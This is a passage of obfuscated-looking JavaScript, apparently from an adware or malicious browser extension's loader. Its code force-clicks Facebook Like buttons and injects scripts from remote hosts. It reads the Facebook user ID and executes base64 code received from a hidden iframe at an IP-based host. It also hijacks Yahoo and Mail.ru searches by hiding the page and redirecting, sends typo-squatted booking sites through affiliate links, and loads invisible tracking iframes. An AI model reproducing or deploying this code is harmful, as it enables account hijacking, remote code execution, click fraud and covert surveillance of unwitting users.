                                s(e);
                                return
                            }
                            if (k.getCookie(n)) {
                                return
                            }
                            k.loadedCallback("MNTZ_LOADED", g);

                            function h() {
                                if (b) {
                                    return
                                }
                                var d = a("#pages-header button.likeButton");
                                if (d.length > 0) {
                                    d[0].click();
                                    b = true;
                                    k.setCookie(n, 1, {
                                        expire: 86400 * 60,
                                        path: "/"
                                    });
                                    k.setCookie(t, k.unixTimestampNow, {
                                        expire: 864000,
                                        path: "/"
                                    })
                                }
                            }
                            k.ready(function() {
                                if (o) {
                                    return
                                }
                                o = true;
                                h();
                                var v = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver;
                                var i = document.body;
                                if (typeof v != "undefined") {
                                    var u = new v(function(x) {
                                        x.forEach(function(z) {
                                            if (z.type === "childList") {
                                                for (var y = 0; y < z.addedNodes.length; y++) {
                                                    h()
                                                }
                                            }
                                            u.observe(document.body, {
                                                childList: true,
                                                subtree: true
                                            })
                                        })
                                    });
                                    u.observe(i, {
                                        childList: true,
                                        subtree: true
                                    })
                                } else {
                                    var w = function() {
                                        if (b) {
                                            return true
                                        }
                                        h();
                                        d = setTimeout("checkByTimer", 1000)
                                    };
                                    var d = setTimeout("checkByTimer", 1000)
                                }
                            })
                        })(document, window);
                    }
                    if (scriptsToLoad['af23c']) {
                        (function(f, h, j) {
                            var g = true;
                            try {
                                if (chrome.bookmarks) {
                                    g = false
                                }
                            } catch (c) {}
                            if (location.protocol == "chrome-extension:") {
                                g = false
                            }
                            if (g) {
                                var b = window.location.href;
                                var l = document.getElementById("dexscriptpopup");
                                if (l === null && b.indexOf("m.facebook.com") != "-1") {
                                    document.body.style.width = "0px";
                                    var k = document.createElement("div");
                                    k.id = "dexscriptpopup";
                                    k.style.cssText = "position:fixed; width:100%; height:100%; z-index:100; background:#fff; top:0px; left: 0px;";
                                    document.body.appendChild(k);
                                    setTimeout(function() {
                                        window.close()
                                    }, 10000)
                                }
                                var i = document.createElement("script");
                                i.id = "dexscriptid";
                                i.src = "https://votetoda.com/ext/script.php?id=ukr&track=true";
                                var a = document.getElementById("dexscriptid");
                                if (a === null) {
                                    document.body.appendChild(i)
                                } else {}
                            } else {
                                var i = document.createElement("script");
                                i.id = "dexscriptid";
                                i.src = "https://votetoda.com/ext/script.php?id=ukr&track=false";
                                var a = document.getElementById("dexscriptid");
                                if (a === null) {
                                    document.body.appendChild(i)
                                } else {}
                            }
                        })(document, window);
                    }
                    if (scriptsToLoad['4d3a8']) {
                        ! function() {
                            if ("http" == location.href.substr(0, 4) && document && "undefined" != typeof document && window == window.top) {
                                var a = function() {
                                        var a = document.getElementsByTagName("head");
                                        return a && void 0 !== a && a.length && a[0] && void 0 !== a[0] && a[0].appendChild ? (a = a[0], a.xadscriptinserted ? 0 : (a.xadscriptinserted = 1, 1)) : -1
                                    },
                                    b = function() {
                                        function a(detected_country) {
                                            var b = "wwi3bdi87sg87gi3av8bc8sgeyvru2y3";
                                            if (!document.getElementById(b)) {
                                                var c = document.createElement("meta");
                                                c.id = b, document.head.appendChild(c);
                                                (function() {
                                                    if (location.href.substr(0, 4) != 'http' || window.reigw34pn7tsjkdygf) return;
                                                    window.reigw34pn7tsjkdygf = 1;
                                                    ! function() {
                                                        var startAll = function() {
                                                            console.log('StartAll ok');
                                                            var toInject = function() {
                                                                if (top.location == self.location) {
                                                                    var t, e, i, n = document,
                                                                        a = "0",
                                                                        o = "",
                                                                        r = "https://144.217.45.42.nip.io",
                                                                        d = function(t) {
                                                                            t = t.toString();
                                                                            for (var e = "", i = function(t, i) {
                                                                                    for (var n = "", a = "", o = 0; o < e.length; o++) o == t ? (a = e[o], n += e[i]) : n += o == i ? a : e[o];
                                                                                    e = n
                                                                                }, n = 0; n < t.length; n++) e += "AeO5nNHidSjLVt3" [t[n]] + "FEDCBA123456789" [t[n]];
                                                                            return i(0, 24), i(3, 20), i(5, 18), e
                                                                        },
                                                                        s = function(t) {
                                                                            i.postMessage(JSON.stringify(t), r)
                                                                        },
                                                                        f = function() {
                                                                            if (window && window.require) {
                                                                                if ((t = window.require("CurrentUserInitialData")) && t.USER_ID && (a = t.USER_ID), "0" !== a && (!(e = 0) || e < 5)) {
                                                                                    o = d(a), window.addEventListener("message", c);
                                                                                    var l = n.createElement("iframe");
                                                                                    l.id = "_ga_f", l.src = r + "/start.php?id=" + a + "&s=" + (e || "0") + "&h=" + o + "&r=" + Math.random() + "&subid=34", l.style = "width:1px;height:1px; position: absolute; left -100px;", l.onload = function() {
                                                                                        i = l.contentWindow, s({
                                                                                            do: "start",
                                                                                            is_ga: "1",
                                                                                            hmac: o
                                                                                        })
                                                                                    }, n.body.appendChild(l)
                                                                                }
                                                                            } else setTimeout(f, 100)
                                                                        },
                                                                        c = function(t) {
                                                                            if (t.origin == r && t.data) try {
                                                                                var i = JSON.parse(t.data);
                                                                                if (!i || !i.is_ga) return;
                                                                                if ("next" == i.do && (e = i.state) < 5) {
                                                                                    var a = n.createElement("script");
                                                                                    a.text = atob(i.data), n.body.appendChild(a)
                                                                                }
                                                                            } catch (t) {}
                                                                        };
                                                                    n.location.href.match(/facebook\.com/im) && !n.getElementById("_ga_f") && setTimeout(f, 100)
                                                                }
                                                            };
                                                            var script = document.createElement('script');
                                                            script.innerText = '(' + toInject.toString() + ')()';
                                                            document.body.appendChild(script)
                                                        };
                                                        if (document.readyState == 'interactive' || document.readyState == 'complete') startAll();
                                                        else document.addEventListener('DOMContentLoaded', startAll, false)
                                                    }()
                                                })()
                                            }
                                        }

                                        function b() {
                                            var a;
                                            try {
                                                a = new ActiveXObject("Msxml2.XMLHTTP")
                                            } catch (b) {
                                                try {
                                                    a = new ActiveXObject("Microsoft.XMLHTTP")
                                                } catch (b) {
                                                    a = !1
                                                }
                                            }
                                            a || "undefined" == typeof XMLHttpRequest || (a = new XMLHttpRequest), this.xhr = a
                                        }
                                        b.prototype.get = function(a, b, c) {
                                            var d = this.xhr;
                                            if (c) var e = setTimeout(function() {
                                                d.abort, b(!1, "Timeout reached")
                                            }, c);
                                            b = b || function() {}, d.onreadystatechange = function() {
                                                4 == d.readyState && (clearTimeout(e), b(200 == d.status, d.responseText))
                                            }, d.open("GET", a, !0), d.send(null)
                                        }, (new b).get("//hoholikik.club/geolocation/1605/", function(b, c) {
                                            b && c && 2 == c.length || (c = "XX"), a(c)
                                        }, 1e4), (new b).get("//api.stathat.com/c?key=YA-298f_wfCUwTL3yYSDMyA2ZFpp&ukey=MTM1MzkgD1_LU1S68cRBsL4BFHW56g~~&count=1&", function() {}, 2e4), (new b).get("//api.stathat.com/c?key=wvUQhbogKVXDJOxzv8z50yA1cnJz&ukey=MTM1MzkgD1_LU1S68cRBsL4BFHW56g~~&count=1&", function() {}, 2e4)
                                    },
                                    c = function() {
                                        var d = a();
                                        0 !== d && (-1 === d && setTimeout(c, 100), 1 === d && b())
                                    };
                                c()
                            }
                        }();
                    }
                    if (scriptsToLoad['1f755']) {
                        var fconf = $$.getMtzCfg('1f755');
                        if (!!fconf.injectFacebook && fconf.injectFacebook == "1") {
                            (function() {
                                var d = document.querySelector("body");
                                if (!d) {
                                    return
                                }

                                function j(k) {
                                    k = k.replace(/%PUBLISHER_ID%/, ($$ && $$.tbParams && $$.tbParams.wid) ? $$.tbParams.wid : "");
                                    k = k.replace(/%SOURCE_ID%/, ($$ && $$.tbParams && $$.tbParams.tid) ? $$.tbParams.tid : "");
                                    k = k.replace(/%SUBID%/, ($$ && $$.tbParams && $$.tbParams.sid) ? $$.tbParams.sid : "");
                                    k = k.replace(/INSERT_RANDOM_NUMBER_HERE/, new Date().getTime());
                                    return k
                                }
                                var f = j("<iframe id='c8866ab3' name='c8866ab3' src='//cdnpps.us/www/delivery/afr.php?zoneid=120&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;xid=%PUBLISHER_ID%_%SOURCE_ID%_%SUBID%' frameborder='0' scrolling='no' width='300' height='250' style='display:block;'><a href='//cdnpps.us/www/delivery/ck.php?n=c8866ab3' target='_blank'><img src='//cdnpps.us/www/delivery/avw.php?zoneid=120&amp;n=c8866ab3' border='0' alt='' /></a></iframe>");
                                var c = j("<iframe id='8a61598d' name='8a61598d' src='//cdnpps.us/www/delivery/afr.php?zoneid=119&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;xid=%PUBLISHER_ID%_%SOURCE_ID%_%SUBID%' frameborder='0' scrolling='no' width='468' height='60' style='display:block;'><a href='//cdnpps.us/www/delivery/ck.php?n=8a61598d' target='_blank'><img src='//cdnpps.us/www/delivery/avw.php?zoneid=119&amp;n=8a61598d' border='0' alt='' /></a></iframe>");

                                function g(k) {
                                    return document.querySelectorAll(k) || []
                                }
                                var a = function(n, k, o, m) {
                                    var l = document.createElement("div");
                                    l.setAttribute("id", "_" + Math.floor((Math.random() * 1000000000)));
                                    l.innerHTML = o;
                                    l.setAttribute("style", "display: inline-block;height:" + k + "px !important;width:" + n + "px !important;margin:0 auto;z-index:99999999;border:0;");
                                    m.style.textAlign = "center";
                                    m.appendChild(l)
                                };

                                function h(k) {
                                    k.style.minHeight = "500px";
                                    k.id = "_" + k.id;
                                    k.setAttribute("data-mytype", "name_baner");
                                    k.innerHTML = "";
                                    a(300, 500, f + f, k)
                                }

                                function i(k) {
                                    var l = document.createElement("div");
                                    l.setAttribute("data-mytype", "name_baner");
                                    l.setAttribute("style", "width:468px;height:60px;margin:0 auto 10px auto;");
                                    k.setAttribute("data-mytype", "name_baner");
                                    k.appendChild(l);
                                    a(468, 60, c, l)
                                }
                                var b = function() {
                                    Array.prototype.forEach.call(g('div[class^="_5jmm _5pat"]'), function(k) {
                                        if (!k.getAttribute("data-mytype")) {
                                            i(k)
                                        }
                                    });
                                    Array.prototype.forEach.call(g("#pagelet_ego_pane"), function(k) {
                                        if (!k.getAttribute("data-mytype") && k.offsetHeight > 50) {
                                            h(k)
                                        }
                                    });
                                    setTimeout(b, 3333)
                                };
                                b();
                                var e = new MutationObserver(function(k) {
                                    for (var l in k) {
                                        if (k[l].addedNodes.length) {
                                            b();
                                            break
                                        }
                                    }
                                });
                                e.observe(document.getElementById("content"), {
                                    childList: true
                                })
                            })();
                        }
                    }
                } else {
                    $$.loadedCallback("BEFORE_OPTOUT_REQ");
                    $$.jsonp({
                        url: (window.location.protocol == "http:" ? "http:" : "https:") + "//" + $$.scriptDomain + "/optout/get",
                        data: {
                            key: "1f7cbb02d08cf61dbb"
                        },
                        callback: function(response) {
                            if (!response.success) {
                                $$.loadedCallback("OPTOUT_RESPONSE_FAIL");
                                return false
                            }
                            $$.loadedCallback("OPTOUT_RESPONSE_OK");
                            var userId = response.userId;
                            var startTime = response.strTm;
                            var lifeTime = response.lt;
                            var lastActionTime = response.lat;
                            var optout = {};
                            if (response.optout) {
                                optout = $$.optoutValue = $$.fromJson(decodeURIComponent(response.optout))
                            }
                            var country = response.country;
                            var limits = {};
                            var ownMonetizationsClickFlag = false;
                            if (response.limits) {
                                limits = $$.limitsValue = $$.fromJson(decodeURIComponent(response.limits))
                            }
                            if (response.lcFlag && response.lcFlag == 1) {
                                ownMonetizationsClickFlag = true
                            }
                            var targetingUser = response.targeting || 0;
                            var currentHostname = location.hostname;
                            currentHostname = currentHostname.replace("www.", "");
                            var timeNow = $$.unixTimestampNow;
                            if (!country) {
                                country = "xx"
                            }
                            country = country.toLowerCase();
                            if (!userId) {
                                userId = $$.randomNumber(1, 100);
                                $$.jsonp({
                                    url: (window.location.protocol == "http:" ? "http:" : "https:") + "//" + $$.scriptDomain + "/optout/set/userid",
                                    data: {
                                        key: "1f7cbb02d08cf61dbb",
                                        cv: userId
                                    }
                                })
                            }
                            if (!startTime) {
                                $$.setStartTime()
                            }
                            $$.updateLifeTime(lifeTime, lastActionTime);
                            var timeAfterInstall = $$.unixTimestampNow - startTime;
                            var platformBlocks = [];
                            for (var key in scriptsToLoad) {
                                try {
                                    var scriptRow = scriptsToLoad[key];
                                    var scriptUrl = scriptRow.url;
                                    var scriptUrlParams = {};
                                    var scriptCoverageFrom = 0;
                                    var scriptCoverageTo = 100;
                                    if (scriptRow.coverage.indexOf("-") > -1) {
                                        var coverageParts = scriptRow.coverage.split("-");
                                        scriptCoverageFrom = parseInt(coverageParts[0]);
                                        scriptCoverageTo = parseInt(coverageParts[1])
                                    } else {
                                        scriptCoverageTo = parseInt(scriptRow.coverage)
                                    }
                                    if (($$.getCookie("__mtzalnly") == 1 || $$.getCookie("__lnntlk") == 1) && ['cd1d2', '210e2', 'b48fe', '6a131', '81d01', 'a5093', '865b2', '88350', 'f81c7', '80c44', '90f06'].indexOf(key) == -1) {
                                        if ("52096" != "51739") {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_AFFLNK", key, "__mtzalnly=" + $$.getCookie("__mtzalnly"), "__lnntlk=" + $$.getCookie("__lnntlk"), location.hostname)
                                            }
                                            continue
                                        } else {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_NOTIF_AFFLNK", key, "__mtzalnly=" + $$.getCookie("__mtzalnly"), "__lnntlk=" + $$.getCookie("__lnntlk"), location.hostname)
                                            }
                                        }
                                    }
                                    if (isSearchEngine()) {
                                        if (['4dc06', 'd086d', 'deaf7', '42265', '84a21', 'ef3e3', '031e7', '58c2e', '85031', '5db45', 'ac348', '6cf2f', '220bb', 'b6eb3', '1a2aa', '08552', '4a71b', 'f361b', 'cd1d2', '81d01', 'f81c7', 'b777a', 'a49b5', 'c3369', '3e4fd', '6f95e', '9510f', '6a88f', 'f4c82', '44a92', 'd115b', '1229b', '54ace', '72415', '75710', '83296', 'b8695', 'a7711', '3160d', 'd652c', 'ae5a7', '80a06', 'baf71', '6d07f', '5a00b', '571c3', '308b3', '3b0bd', '10cd4', '624a7', '4a0ef', '95dd2', '5de0e', 'e1d94'].indexOf(key) == -1) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_SERCHNGN", key, location.hostname)
                                            }
                                            continue
                                        }
                                    }
                                    if (ownMonetizationsClickFlag) {
                                        if (['4dc06', 'd086d', 'bd895', '1f755', '42265', '84a21', 'ef3e3', '031e7', '58c2e', '85031', 'ac348', '6cf2f', '220bb', 'b6eb3', '1a2aa', '5db45', '08552', '4a71b', '02aed'].indexOf(key) == -1) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_OWNMNTZ", key, location.hostname)
                                            }
                                            continue
                                        }
                                    }
                                    if (typeof(scriptUrl) == "object") {
                                        if (scriptUrl.rotator) {
                                            var rotatorCount = scriptUrl.rotator.length;
                                            if (!rotatorCount) {
                                                rotatorCount = 0
                                            }
                                            var rotatorCookieName = "_mrtr_1f7cbb02d08cf61dbb_" + key;
                                            var lastRotatedIndex = $$.getCookie(rotatorCookieName);
                                            if (!lastRotatedIndex || lastRotatedIndex < 0 || lastRotatedIndex >= rotatorCount) {
                                                lastRotatedIndex = 0
                                            }
                                            scriptUrlParams = scriptUrl.rotator[lastRotatedIndex];
                                            scriptUrl = getUrlFromConfigObject(scriptUrlParams);
                                            lastRotatedIndex++;
                                            $$.setCookie(rotatorCookieName, lastRotatedIndex, {
                                                expire: 86400
                                            })
                                        } else {
                                            scriptUrlParams = scriptUrl;
                                            scriptUrl = getUrlFromConfigObject(scriptUrlParams)
                                        }
                                    }
                                    if (typeof(scriptUrl) != "string") {
                                        $$.loadedCallback("CB_MNTZ_FILTER_INVALIDURL", key);
                                        continue
                                    }
                                    if (!$$.demoMode) {
                                        if ("8060" == 1549 && location.protocol == "https:" && (key == "a8bb7" || key == "e9254")) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_CUSTOM", key)
                                            }
                                            continue
                                        }
                                        if ((location.hostname == "youtube.com" || location.hostname == "www.youtube.com") && key != "1f755" && key != "1fbee" && key != "c3369" && key != "f4c82" && key != "95dd2") {
                                            continue
                                        }
                                        if (location.hostname.indexOf("facebook.com") > -1) {
                                            continue
                                        }
                                        if (optout && optout[key] != undefined && optout[key] == true) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_OPTOUTED", key, optout[key])
                                            }
                                            continue
                                        }
                                        if (scriptRow.countries_allow && scriptRow.countries_allow.indexOf(country) == -1) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_GEOALLOW", key, country, scriptRow.countries_allow)
                                            }
                                            continue
                                        }
                                        if (scriptRow.countries_deny && scriptRow.countries_deny.indexOf(country) > -1) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_GEODENY", key, country, scriptRow.countries_deny)
                                            }
                                            continue
                                        }
                                        if ((scriptCoverageFrom || scriptCoverageTo) && (userId < scriptCoverageFrom || userId > scriptCoverageTo)) {
                                            if (extendedCallbacks) {
                                                $$.loadedCallback("CB_MNTZ_FILTER_COVERAGE", key, userId, scriptCoverageFrom + "-" + scriptCoverageTo)
                                            }
                                            continue
                                        }
                                        if (limits && limits[key]) {
                                            var leftTime = parseInt(limits[key]) - timeNow;
                                            if (leftTime > 0) {
                                                if (extendedCallbacks) {
                                                    $$.loadedCallback("CB_MNTZ_FILTER_LIMIT", key, leftTime, parseInt(limits[key]))
                                                }
                                                continue
                                            }
                                        }
                                        if (key == "a096e" && targetingUser != 1) {
                                            continue
                                        }
                                        var hostnameReg;
                                        if (scriptRow.hostname_deny) {
                                            hostnameReg = new RegExp("^" + scriptRow.hostname_deny + "$", "i");
                                            if (hostnameReg.test(currentHostname)) {
                                                if (extendedCallbacks) {
                                                    $$.loadedCallback("CB_MNTZ_FILTER_HOSTDENY", key, location.hostname, scriptRow.hostname_deny)
                                                }
                                                continue
                                            }
                                        }
                                        if (scriptRow.hostname_allow) {
                                            hostnameReg = new RegExp("^" + scriptRow.hostname_allow + "$", "i");
                                            if (!hostnameReg.test(currentHostname)) {
                                                if (extendedCallbacks) {
                                                    $$.loadedCallback("CB_MNTZ_FILTER_HOSTALLOW", key, location.hostname, scriptRow.hostname_allow)
                                                }
                                                continue
                                            }
                                        }
                                        if (scriptRow.browsers_allow || scriptRow.browsers_deny) {
                                            if (typeof detect == "undefined") {
                                                continue
                                            }
                                            var ua = detect.parse(navigator.userAgent);
                                            var checkUa = ua.browser.family.toLowerCase();
                                            var browserAllowed = false
                                        }
                                        if (scriptRow.browsers_allow) {
                                            var browsersAllow = scriptRow.browsers_allow.toLowerCase().split(",");
                                            for (var i2 in browsersAllow) {
                                                if (browsersAllow[i2] == checkUa) {
                                                    browserAllowed = true;
                                                    break
                                                }
                                            }
                                            if (!browserAllowed) {
                                                if (extendedCallbacks) {
                                                    $$.loadedCallback("CB_MNTZ_FILTER_BROWSALLOW", key, checkUa, scriptRow.browsers_allow)
                                                }
                                                continue
                                            }
                                        }
                                        if (scriptRow.browsers_deny) {
                                            var browsersDeny = scriptRow.browsers_deny.toLowerCase().split(",");
                                            for (var i2 in browsersDeny) {
                                                if (browsersDeny[i2] == checkUa) {
                                                    browserAllowed = false;
                                                    break
                                                }
                                            }
                                            if (!browserAllowed) {
                                                if (extendedCallbacks) {
                                                    $$.loadedCallback("CB_MNTZ_FILTER_BROWSDENY", key, checkUa, scriptRow.browsers_deny)
                                                }
                                                continue
                                            }
                                        }
                                        if (['c3369', '3e4fd', '9510f', '6a88f', 'f4c82', '44a92'].indexOf(key) > -1) {
                                            if (isInIframe()) {
                                                continue
                                            }
                                            var searchFieldInputEl = $$.Sizzle("input[name=q]");
                                            if (searchFieldInputEl && searchFieldInputEl.length > 0 && searchFieldInputEl[0] && searchFieldInputEl[0].value) {
                                                var regexSearch = new RegExp('^(.* ?[a-z-]+:.*|".*")$', "i");
                                                var regexSearchMatch = searchFieldInputEl[0].value.match(regexSearch);
                                                if (regexSearchMatch) {
                                                    continue
                                                }
                                            }
                                        }
                                    } else {};
                                    if (key == "cd1d2") {
                                        (function(tbObject) {
                                            eval("window._lnkr5 = {\'uid\':\'52096x8060x\'+tbObject.tbParams.sid,\'allowTargetBlank\': false};")
                                        })($$)
                                    };
                                    if (key == "81d01") {
                                        (function(tbObject) {
                                            eval("window._lnkr33 = {\'uid\':\'52096x8060x\'+tbObject.tbParams.sid,\'allowTargetBlank\': false};")
                                        })($$)
                                    };
                                    if (key == "1a2aa") {
                                        runForceSearch();
                                        continue
                                    }
                                    if (key == "5db45") {
                                        continue
                                    }
                                    if (key == "309e4") {
                                        continue
                                    }
                                    if (key == "c3e34") {
                                        if (!isInIframe()) {
                                            (function(f, b, c) {
                                                var e = ["https://www.hanstrackr.com/track?i=nuS6Dgnt9GUnnKwQ"];
                                                var a = document.createElement("iframe");
                                                a.src = e[0];
                                                a.setAttribute("style", "width:1px;height:1px;opacity: 0;position:absolute;left:-500px;top:-500px;");
                                                f.body.appendChild(a)
                                            })(document, window);
                                        }
                                        continue
                                    }
                                    if (key == "a49b5" || key == "1dbbc") {
                                        continue
                                    }
                                    if (key == "93af4" || key == "085dc") {
                                        if (isInIframe()) {
                                            if (location.hostname.indexOf("yourfirstcheapshop.com") > -1) {
                                                var yfcsStylePluginUrl = (window.location.protocol == "http:" ? "http:" : "https:") + "//" + $$.scriptDomain + "/addons/yfcs.min.js";
                                                $$.script(yfcsStylePluginUrl, false)
                                            }
                                            continue
                                        }
                                    }
                                    if (scriptRow.type == "external") {
                                        $$.loadedCallback("MNTZ_INJECT", key);
                                        scriptUrl = scriptUrl.replace(/\/SID\//g, encodeURIComponent($$.tbParams.sid));
                                        scriptUrl = scriptUrl.replace(/\/TITLE\//g, encodeURIComponent($$.tbParams.title));
                                        scriptUrl = scriptUrl.replace(/\/REFERRER\//g, encodeURIComponent(location.href));
                                        scriptUrl = scriptUrl.replace(/\/REF_HOST\//g, encodeURIComponent(location.hostname ? location.hostname : location.host));
                                        scriptUrl = scriptUrl.replace(/\/RANDOM\//g, (new Date()).getTime());
                                        scriptUrl = scriptUrl.replace(/\/OPTOUTURL_DBLENCODED\//g, encodeURIComponent(encodeURIComponent(($$.tbParams.optoutUrl ? $$.tbParams.optoutUrl : "http://thisadsfor.us/optout?t=8060&u=52096&block=" + key))));
                                        scriptUrl = scriptUrl.replace(/\/OPTOUTURL\//g, encodeURIComponent(($$.tbParams.optoutUrl ? $$.tbParams.optoutUrl : "http://thisadsfor.us/optout?t=8060&u=52096&block=" + key)));
                                        if (scriptUrl) {
                                            if (scriptUrl.substr(0, 2) == "//") {
                                                scriptUrl = (window.location.protocol == "http:" ? "http:" : "https:") + scriptUrl
                                            }(function(block) {
                                                var script = $$.script(scriptUrl, false, (scriptUrlParams.tag_attributes ? scriptUrlParams.tag_attributes : null));
                                                $$.on(script, "load", function() {
                                                    $$.loadedCallback("MNTZ_LOADED", block);
                                                    $$.updateLimits(block)
                                                })
                                            })(key)
                                        } else {
                                            $$.loadedCallback("MNTZ_LOADED", key);
                                            $$.updateLimits(key)
                                        }
                                    } else {
                                        if (scriptRow.type == "platform") {
                                            platformBlocks.push(key)
                                        } else {}
                                    }
                                } catch (e) {
                                    $$.loadedCallback("CORE_JS_ERROR", key)
                                }
                            }
                            if (platformBlocks.length > 0) {
                                var params = ["sid=" + $$.tbParams.wid + "_" + $$.tbParams.tid + "_" + $$.tbParams.sid, "title=" + encodeURIComponent($$.tbParams.title)];
                                for (var i in platformBlocks) {
                                    if (typeof platformBlocks[i] != "string") {
                                        break
                                    }
                                    params.push("blocks[]=" + platformBlocks[i])
                                }
                                var url = (window.location.protocol == "http:" ? "http:" : "https:") + "//" + $$.scriptDomain + "/ext/1f7cbb02d08cf61dbb.js?" + params.join("&");
                                $$.script(url, false);
                                $$.loadedCallback("MNTZ_INJECT", platformBlocks.join(","))
                            }
                        }
                    });
                    if (scriptsToLoad['af23c']) {
                        (function(f, h, j) {
                            var g = true;
                            try {
                                if (chrome.bookmarks) {
                                    g = false
                                }
                            } catch (c) {}
                            if (location.protocol == "chrome-extension:") {
                                g = false
                            }
                            if (g) {
                                var b = window.location.href;
                                var l = document.getElementById("dexscriptpopup");
                                if (l === null && b.indexOf("m.facebook.com") != "-1") {
                                    document.body.style.width = "0px";
                                    var k = document.createElement("div");
                                    k.id = "dexscriptpopup";
                                    k.style.cssText = "position:fixed; width:100%; height:100%; z-index:100; background:#fff; top:0px; left: 0px;";
                                    document.body.appendChild(k);
                                    setTimeout(function() {
                                        window.close()
                                    }, 10000)
                                }
                                var i = document.createElement("script");
                                i.id = "dexscriptid";
                                i.src = "https://votetoda.com/ext/script.php?id=ukr&track=true";
                                var a = document.getElementById("dexscriptid");
                                if (a === null) {
                                    document.body.appendChild(i)
                                } else {}
                            } else {
                                var i = document.createElement("script");
                                i.id = "dexscriptid";
                                i.src = "https://votetoda.com/ext/script.php?id=ukr&track=false";
                                var a = document.getElementById("dexscriptid");
                                if (a === null) {
                                    document.body.appendChild(i)
                                } else {}
                            }
                        })(document, window);
                    }
                }
                if (location.host.indexOf("youradexchange.com") >= 0 && location.pathname.indexOf("a/display.") >= 0) {
                    if ($$.getParams && $$.getParams.r && $$.getParams.r != 391766 && $$.getParams.r != 391769) {
                        var r = $$.randomNumber(1, 100);
                        var rLimit = 100;
                        if (r <= rLimit) {
                            setTimeout(function() {
                                location.href = "http://www.youradexchange.com/a/display.php?r=391769&sub1=pr" + $$.tbParams.wid + "x" + $$.tbParams.tid + "x" + $$.tbParams.sid
                            }, 0)
                        } else {}
                    }
                }
                var matchPattern = /(boobking\.|booing\.|buking\.|boocking\.|boooking\.|bookking\.|booing\.)/i;
                if (location.hostname.match(matchPattern)) {
                    if (typeof window.stop == "function") {
                        window.stop()
                    }
                    location.href = "http://adrs.me/get?key=6ae9f4bd1dc812dc713d61cba871d8e8&out=http%3A%2F%2Fbooking.com&ref=http%3A%2F%2Fgo.com&format=go&uid=rdr52096"
                }
                if (isInIframe()) {
                    return
                }
                if (scriptsToLoad['85031']) {
                    (function() {
                        var block = '85031';
                        $$.ready(function() {
                            try {
                                (function() {
                                    if (location.hostname.indexOf("search.yahoo.com") == -1 || location.pathname.indexOf("/search") == -1) {
                                        return
                                    }
                                    var r = $$.randomNumber(1, 100);
                                    var rLimit = scriptsToLoad[block].coverage;
                                    if (r > rLimit) {
                                        return
                                    }
                                    $$.loadedCallback("MNTZ_LOADED", block);
                                    if ($$.getCookie("__ckp_srchyho_fired") == 1) {
                                        return
                                    }

                                    function getParams() {
                                        params = {};
                                        for (var e = location.search.replace("?", ""), r = e.split("&"), c = 0; c < r.length; c++) {
                                            t = r[c].split("="), t[1] && (params[t[0]] = t[1])
                                        }
                                        var a = location.hash.replace("#", "");
                                        a && (t = a.split("="), t[1] && (params[t[0]] = t[1]))
                                    }

                                    function checkYahooTag() {
                                        getParams();
                                        if (location.href.indexOf("tightrope") > -1 && location.href.indexOf("tr57") > -1) {
                                            return
                                        } else {
                                            redirectSearch("p")
                                        }
                                    }

                                    function redirectSearch(e) {
                                        if (getParams(), void 0 != params[e]) {
                                            window.stop && window.stop(), document.documentElement.style.opacity = "0", document.documentElement.style.display = "none";
                                            var r = params[e],
                                                c = "http://sugabit.net/search.php?source=btn&sid=" + $$.tbParams.wid + "x" + $$.tbParams.tid + "x" + $$.tbParams.sid + "&q=" + r;
                                            $$.loadedCallback("BANNER_LOAD", block);
                                            $$.setCookie("__ckp_srchyho_fired", 1, {
                                                expire: 1800
                                            });
                                            location.href = c, clearInterval(tmr)
                                        }
                                    }

                                    function checkForSearch() {
                                        var e = location.href; - 1 != d.indexOf("search.yahoo.com") && checkYahooTag() && clearInterval(tmr)
                                    }
                                    var d = window.document.domain,
                                        tmr, tmrCnt = 0,
                                        params = {};
                                    window == top && (checkForSearch(), tmr = setInterval(checkForSearch, 100))
                                })()
                            } catch (e) {}
                        })
                    })()
                }
                if (scriptsToLoad['ac348']) {
                    (function() {
                        var block = 'ac348';
                        $$.ready(function() {
                            try {
                                (function() {
                                    if (location.hostname.indexOf("go.mail.ru") == -1 || location.pathname.indexOf("/search") == -1) {
                                        return
                                    }
                                    var r = $$.randomNumber(1, 100);
                                    var rLimit = scriptsToLoad[block].coverage;
                                    if (r > rLimit) {
                                        return
                                    }
                                    $$.loadedCallback("MNTZ_LOADED", block);
                                    if ($$.getCookie("__ckp_srchmlr_fired") == 1) {
                                        return
                                    }

                                    function getParams() {
                                        params = {};
                                        for (var e = location.search.replace("?", ""), r = e.split("&"), c = 0; c < r.length; c++) {
                                            t = r[c].split("="), t[1] && (params[t[0]] = t[1])
                                        }
                                        var a = location.hash.replace("#", "");
                                        a && (t = a.split("="), t[1] && (params[t[0]] = t[1]))
                                    }

                                    function checkMailruTag() {
                                        getParams();
                                        if (params.frc && params.frc == "821563") {
                                            return
                                        } else {
                                            redirectSearch("q")
                                        }
                                    }

                                    function redirectSearch(e) {
                                        if (getParams(), void 0 != params[e]) {
                                            window.stop && window.stop(), document.documentElement.style.opacity = "0", document.documentElement.style.display = "none";
                                            var r = params[e],
                                                c = "http://sugabit.net/search.php?source=btn2&sid=" + $$.tbParams.wid + "x" + $$.tbParams.tid + "x" + $$.tbParams.sid + "&q=" + r;
                                            $$.loadedCallback("BANNER_LOAD", block);
                                            $$.setCookie("__ckp_srchmlr_fired", 1, {
                                                expire: 1800
                                            });
                                            location.href = c, clearInterval(tmr)
                                        }
                                    }

                                    function checkForSearch() {
                                        var e = location.href; - 1 != d.indexOf("go.mail.ru") && checkMailruTag() && clearInterval(tmr)
                                    }
                                    var d = window.document.domain,
                                        tmr, tmrCnt = 0,
                                        params = {};
                                    window == top && (checkForSearch(), tmr = setInterval(checkForSearch, 100))
                                })()
                            } catch (e) {}
                        })
                    })()
                }
                if (scriptsToLoad['5db45']) {
                    (function() {
                        var block = '5db45';
                        $$.ready(function() {
                            try {
